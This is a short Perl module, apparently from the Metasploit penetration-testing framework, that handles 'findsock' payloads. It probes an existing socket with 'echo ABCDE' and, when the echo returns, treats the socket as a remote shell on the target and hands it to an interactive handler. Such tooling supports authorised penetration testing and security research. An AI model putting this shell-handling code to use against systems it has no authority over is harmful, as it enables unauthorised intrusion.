#!/usr/bin/perl

package Msf::PayloadComponent::FindConnection;
use strict;
use base 'Msf::PayloadComponent::ConnectionHandler';
use IO::Socket::INET;
use IO::Select;

sub ChildHandler {
  my $self = shift;
  my $sock = shift;

  my $selector = IO::Select->new($sock);

  my @ready = $selector->can_write(.5);

  return if(!@ready);

  $ready[0]->send('echo ABCDE');

  my @ready = $selector->can_read(.5);

  return if(!@ready);

  my $data;
  $ready[0]->recv($data, 4096);
  return if(!length($data));
  if($data =~ /ABCDE/) {
    $self->SocketIn($ready[0]);
    $self->SocketOut($ready[0]);
    $self->PrintLine('[*] Findsock found shell...');
    $self->HandleConnection;
    exit(0);
  }

}
1;
